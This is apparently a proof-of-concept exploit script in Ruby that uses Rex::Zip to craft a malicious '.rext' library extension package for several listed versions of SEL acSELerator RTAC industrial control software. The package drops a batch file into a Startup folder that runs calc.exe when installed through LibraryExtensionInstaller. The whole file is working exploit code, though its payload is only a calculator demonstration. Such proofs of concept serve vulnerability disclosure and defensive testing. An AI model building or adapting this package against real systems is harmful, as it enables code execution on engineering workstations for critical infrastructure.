#!/usr/bin/env ruby
# acSELerator RTAC Software 1.32.148.7000
# acSELerator RTAC Software 1.29.145.21204
# acSELerator RTAC Software 1.28.144.16958
# acSELerator RTAC Software LibraryExtensionInstaller 1.28.144.16774 
# acSELerator RTAC Software 1.26.143.15566
# acSELerator RTAC Software LibraryExtensionInstaller 1.26.143.15558 
#
# C:\Program Files (x86)\SEL\AcSELerator\RTAC>LibraryExtensionInstaller.exe c:\Users\mc\Desktop\mc.rext
require 'rex/zip'

zip = Rex::Zip::Archive.new
zip.add_file("Startup/cdc.xml")
zip.add_file("Startup/cdc.xml.sig")
zip.add_file("Startup/SEL-PWND.bat", "calc.exe")

zip.save_to("mc.rext")

